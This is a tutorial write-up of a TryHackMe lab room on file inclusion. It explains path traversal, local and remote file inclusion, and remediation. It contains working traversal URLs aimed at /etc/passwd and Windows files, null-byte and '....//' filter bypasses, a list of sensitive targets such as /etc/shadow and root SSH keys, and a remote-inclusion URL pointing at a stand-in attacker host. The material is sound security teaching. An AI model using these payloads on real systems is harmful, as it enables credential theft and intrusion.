---
description: >-
  This room introduces file inclusion vulnerabilities, including Local File
  Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal.
---

# File Inclusion

## Introduction

### What is File Inclusion?

In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters. Parameters are query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input. The following graph explains and breaking down the essential parts of the URL.

![](<../../../.gitbook/assets/image (24) (1) (1) (1) (1).png>)

For example, parameters are used with Google searching, where <mark style="color:red;">`GET`</mark> <mark style="color:red;"></mark><mark style="color:red;"></mark> requests pass user input into the search engine. <mark style="color:red;">`https://www.google.com/search?q=TryHackMe`</mark>

Let's discuss a scenario where a user requests to access files from a webserver. First, the user sends an HTTP request to the webserver that includes a file to display. For example, if a user wants to access and display their `CV` within the web application, the request may look as follows, <mark style="color:red;">`http://webapp.thm/get.php?file=userCV.pdf`</mark>, where the file is the parameter and the <mark style="color:red;">`userCV.pdf`</mark>, is the required file to access.﻿

![](<../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1).png>)

### Why do file inclusion vulnerabilities happen?

File inclusion vulnerabilities are commonly found and exploited in various programming languages for web applications, such as PHP that are poorly written and implemented. The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability.

### What is the risk of File Inclusion?

If the attacker can use file inclusion vulnerabilities to read sensitive data. In that case, the successful attack causes to leak of sensitive data, including code and files related to the web application, credentials for back-end systems. Moreover, if the attacker somehow can write to the server such as <mark style="color:red;">`/tmp`</mark> directory, then it is possible to gain remote command execution RCE. However, it won't be effective if file inclusion vulnerability is found with no access to sensitive data and no writing ability to the server.

## Path Traversal

Also known as Directory traversal, a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application. The attacker exploits this vulnerability by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory.

Path traversal vulnerabilities occur when the user's input is passed to a function such as `file_get_contents` in PHP. It's important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. In PHP, you can use the `file_get_contents` to read the content of a file. You can find more information about the function [here](https://www.php.net/manual/en/function.file-get-contents.php).

The following graph shows how a web application stores files in <mark style="color:red;">`/var/www/app`</mark>. The happy path would be the user requesting the contents of userCV.pdf from a defined path <mark style="color:red;">`/var/www/app/CVs`</mark>.

![](<../../../.gitbook/assets/image (23) (1) (1) (1) (1) (1) (1).png>)

We can test out the URL parameter by adding payloads to see how the web application behaves. Path traversal attacks, also known as the <mark style="color:red;">`dot-dot-slash`</mark> attack, take advantage of moving the directory one step up using the double dots <mark style="color:red;">`../`</mark>. If the attacker finds the entry point, which in this case <mark style="color:red;">`get.php?file=`</mark>, then the attacker may send something as follows, <mark style="color:red;">`http://webapp.thm/get.php?file=../../../../etc/passwd`</mark>

Suppose there isn't input validation, and instead of accessing the PDF files at <mark style="color:red;">`/var/www/app/CVs`</mark> location, the web application retrieves files from other directories, which in this case <mark style="color:red;">`/etc/passwd`</mark>. Each <mark style="color:red;">`..`</mark> entry moves one directory until it reaches the root directory <mark style="color:red;">`/`</mark>. Then it changes the directory to <mark style="color:red;">`/etc`</mark>, and from there, it read the <mark style="color:red;">`passwd`</mark> file.

![](<../../../.gitbook/assets/image (22) (1) (1) (1) (1) (1) (1).png>)

As a result, the web application sends back the file's content to the user.

![](<../../../.gitbook/assets/image (25) (1) (1) (1) (1) (1) (1) (1).png>)

Similarly, if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the <mark style="color:red;">`boot.ini`</mark> file located in <mark style="color:red;">`c:\boot.ini`</mark>, then the attacker can try the following depending on the target OS version:

<mark style="color:red;">`http://webapp.thm/get.php?file=../../../../boot.ini`</mark> or

<mark style="color:red;">`http://webapp.thm/get.php?file=../../../../windows/win.ini`</mark>

The same concept applies here as with Linux operating systems, where we climb up directories until it reaches the root directory, which is usually <mark style="color:red;">`c:\`</mark>.

Sometimes, developers will add filters to limit access to only certain files or directories. Below are some common OS files you could use when testing.

| Location                                                      | Description                                                                                                                                                       |
| ------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| <mark style="color:red;">`/etc/issue`</mark>                  | contains a message or system identification to be printed before the login prompt.                                                                                |
| <mark style="color:red;">`/etc/profile`</mark>                | controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived |
| <mark style="color:red;">`/proc/version`</mark>               | specifies the version of the Linux kernel                                                                                                                         |
| <mark style="color:red;">`/etc/passwd`</mark>                 | has all registered user that has access to a system                                                                                                               |
| <mark style="color:red;">`/etc/shadow`</mark>                 | contains information about the system's users' passwords                                                                                                          |
| <mark style="color:red;">`/root/.bash_history`</mark>         | contains the history commands for <mark style="color:red;">`root`</mark> user                                                                                     |
| <mark style="color:red;">`/var/log/dmessage`</mark>           | contains global system messages, including the messages that are logged during system startup                                                                     |
| <mark style="color:red;">`/var/mail/root`</mark>              | all emails for <mark style="color:red;">`root`</mark> user                                                                                                        |
| <mark style="color:red;">`/root/.ssh/id_rsa`</mark>           | Private SSH keys for a root or any known valid user on the server                                                                                                 |
| <mark style="color:red;">`/var/log/apache2/access.log`</mark> | the accessed requests for Apache webserver                                                                                                                        |
| <mark style="color:red;">`C:\boot.ini`</mark>                 | contains the boot options for computers with BIOS firmware                                                                                                        |

## Local File Inclusion - LFI

LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as <mark style="color:red;">`include`</mark>, <mark style="color:red;">`require`</mark>, <mark style="color:red;">`include_once`</mark>, and <mark style="color:red;">`require_once`</mark> often contribute to vulnerable web applications. In this room, we'll be picking on PHP, but it's worth noting LFI vulnerabilities also occur when using other languages such as ASP, JSP, or even in Node.js apps. LFI exploits follow the same concepts as path traversal.

1. Suppose the web application provides two languages, and the user can select between the <mark style="color:red;">`EN`</mark> and <mark style="color:red;">`AR`</mark>&#x20;

```php
<?PHP 
	include($_GET["lang"]);
?>
```

The PHP code above uses a <mark style="color:red;">`GET`</mark> request via the URL parameter <mark style="color:red;">`lang`</mark> to include the file of the page. The call can be done by sending the following HTTP request as follows: <mark style="color:red;">`http://webapp.thm/index.php?lang=EN.php`</mark> to load the English page or <mark style="color:red;">`http://webapp.thm/index.php?lang=AR.php`</mark> to load the Arabic page, where <mark style="color:red;">`EN.php`</mark> and <mark style="color:red;">`AR.php`</mark> files exist in the same directory.

Theoretically, we can access and display any readable file on the server from the code above if there isn't any input validation. Let's say we want to read the <mark style="color:red;">`/etc/passwd`</mark> file, which contains sensitive information about the users of the Linux operating system, we can try the following: <mark style="color:red;">`http://webapp.thm/get.php?file=/etc/passwd`</mark>

In this case, it works because there isn't a directory specified in the <mark style="color:red;">`include`</mark> function and no input validation.



&#x20;2\. Next, In the following code, the developer decided to specify the directory inside the function.

```php
<?PHP
    include("languages/". $_GET['lang']);
?>
```

In the above code, the developer decided to use the <mark style="color:red;">`include`</mark> function to call <mark style="color:red;">`PHP`</mark> pages in the <mark style="color:red;">`languages`</mark> directory only via <mark style="color:red;">`lang`</mark> parameters.

If there is no input validation, the attacker can manipulate the URL by replacing the <mark style="color:red;">`lang`</mark> input with other OS-sensitive files such as <mark style="color:red;">`/etc/passwd`</mark>.

Again the payload looks similar to the path traversal, but the include function allows us to include any called files into the current page. The following will be the exploit:

<mark style="color:red;">`http://webapp.thm/index.php?lang=../../../../etc/passwd`</mark>

## More LFI Stuff

&#x20;1\. In the first two cases, we checked the code for the web app, and then we knew how to exploit it. However, in this case, we are performing black box testing, in which we don't have the source code. In this case, errors are significant in understanding how the data is passed and processed into the web app.

In this scenario, we have the following entry point: <mark style="color:red;">`http://webapp.thm/index.php?lang=EN`</mark>. If we enter an invalid input, such as THM, we get the following error

```php
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

The error message discloses significant information. By entering THM as input, an error message shows what the include function looks like: <mark style="color:red;">`include(languages/THM.php);`</mark>.

If you look at the directory closely, we can tell the function includes files in the languages directory is adding <mark style="color:red;">`.php`</mark> at the end of the entry. Thus the valid input will be something as follows: <mark style="color:red;">`index.php?lang=EN`</mark>, where the file EN is located inside the given languages directory and named <mark style="color:red;">`EN.php`</mark>.

Also, the error message disclosed another important piece of information about the full web application directory path which is <mark style="color:red;">`/var/www/html/THM-4/`</mark>

To exploit this, we need to use the <mark style="color:red;">`../`</mark> trick, as described in the directory traversal section, to get out the current folder. Let's try the following:

<mark style="color:red;">`http://webapp.thm/index.php?lang=../../../../etc/passwd`</mark>

Note that we used 4 <mark style="color:red;">`../`</mark> because we know the path has four levels <mark style="color:red;">`/var/www/html/THM-4`</mark>. But we still receive the following error:

```php
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

It seems we could move out of the PHP directory but still, the include function reads the input with <mark style="color:red;">`.php`</mark> at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is <mark style="color:red;">`%00`</mark>.

Using null bytes is an injection technique where URL-encoded representation such as <mark style="color:red;">`%00`</mark> or <mark style="color:red;">`0x00`</mark> in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.

By adding the Null Byte at the end of the payload, we tell the <mark style="color:red;">`include`</mark> function to ignore anything after the null byte which may look like:

<mark style="color:red;">`include("languages/../../../../../etc/passwd%00").".php");`</mark> which equivalent to → <mark style="color:red;">`include("languages/../../../../../etc/passwd");`</mark>

{% hint style="warning" %}
The <mark style="color:red;">`%00`</mark> trick is fixed and not working with PHP 5.3.4 and above
{% endhint %}

2\. In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The <mark style="color:red;">`/etc/passwd`</mark> file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte <mark style="color:red;">`%00`</mark> or the current directory trick at the end of the filtered keyword <mark style="color:red;">`/.`</mark>. The exploit will be similar to <mark style="color:red;">`http://webapp.thm/index.php?lang=/etc/passwd/`</mark>. We could also use <mark style="color:red;">`http://webapp.thm/index.php?lang=/etc/passwd%00`</mark>.

To make it clearer, if we try this concept in the file system using <mark style="color:red;">`cd ..`</mark>, it will get you back one step; however, if you do <mark style="color:red;">`cd .`</mark>, It stays in the current directory. Similarly, if we try <mark style="color:red;">`/etc/passwd/..`</mark>, it results to be <mark style="color:red;">`/etc/`</mark> and that's because we moved one to the root. Now if we try <mark style="color:red;">`/etc/passwd/.`</mark>, the result will be <mark style="color:red;">`/etc/passwd`</mark> since dot refers to the current directory.



3\. Next, in the following scenarios, the developer starts to use input validation by filtering some keywords. Let's test out and check the error message!

http://webapp.thm/index.php?lang=../../../../etc/passwd

We got the following error!

```php
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
```

If we check the warning message in the include(languages/etc/passwd) section, we know that the web application replaces the ../ with the empty string. There are a couple of techniques we can use to bypass this.

First, we can send the following payload to bypass it: ....//....//....//....//....//etc/passwd

**Why did this work?**

This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass, leaving what is pictured below.

![](<../../../.gitbook/assets/image (30) (1) (1) (1) (1) (1).png>)

4\. Finally, we'll discuss the case where the developer forces the include to read from a defined directory! For example, if the web application asks to supply input that has to include a directory such as: http://webapp.thm/index.php?lang=languages/EN.php then, to exploit this, we need to include the directory in the payload like so: ?lang=languages/../../../../../etc/passwd

## Remote File Inclusion - RFI

Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into <mark style="color:red;">`include`</mark> function. One requirement for RFI is that the <mark style="color:red;">`allow_url_fopen`</mark> option needs to be <mark style="color:red;">`on`</mark>.

The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:

* Sensitive Information Disclosure
* Cross-site Scripting (XSS)
* Denial of Service (DoS)

An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.

![](<../../../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1).png>)

#### RFI steps

The following figure is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server <mark style="color:red;">`http://attacker.thm/cmd.txt`</mark> where <mark style="color:red;">`cmd.txt`</mark> contains a printing message <mark style="color:red;">`Hello THM`</mark>.

```php
<?PHP echo "Hello THM"; ?>
```

First, the attacker injects the malicious URL, which points to the attacker's server, such as <mark style="color:red;">`http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`</mark>. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a <mark style="color:red;">`GET`</mark> request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the <mark style="color:red;">`Hello THM`</mark> message.

## Remediation

As a developer, it's important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:

1. Keep system and services, including web application frameworks, updated with the latest version.
2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.&#x20;
3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.&#x20;
4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as <mark style="color:red;">`allow_url_fopen`</mark> on and <mark style="color:red;">`allow_url_include`</mark>.&#x20;
5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.&#x20;
6. Never trust user input, and make sure to implement proper input validation against file inclusion.&#x20;
7. Implement whitelisting for file names and locations as well as blacklisting.

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Information courtesy of [Yas3r](https://tryhackme.com/p/Yas3r)

Go to the room [here](https://tryhackme.com/room/fileinc).
